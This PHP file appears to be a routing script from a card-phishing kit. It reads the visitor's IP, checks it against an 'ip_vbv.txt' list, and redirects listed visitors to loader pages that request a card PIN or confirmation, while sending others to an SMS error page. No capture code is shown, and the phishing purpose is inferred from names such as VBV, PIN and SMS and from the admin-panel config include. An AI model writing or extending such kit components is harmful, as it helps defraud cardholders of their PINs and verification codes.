<?php

include("../../Config/panel.php");

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $IP = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $IP = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $IP = $_SERVER['REMOTE_ADDR'];
}
$link_file = "ip_vbv.txt";
$bannedip = file($link_file, FILE_IGNORE_NEW_LINES);
$bannedip = array_map("str_getcsv", $bannedip);
$bannedip = array_column($bannedip, null, 0);
if(isset($bannedip[$IP])) {

    if (PIN === true) {
       header("Location: ../../loader.php?view=pin&id={$id}&ue={$ue}");
    }
    else {
        header("Location: ../../loader.php?view=confirm&id={$id}&ue={$ue}");
    }

   
    
}
else{

    header("Location: ../../sms.php?page=error&userid={$id}&ue={$ue}");
}
?>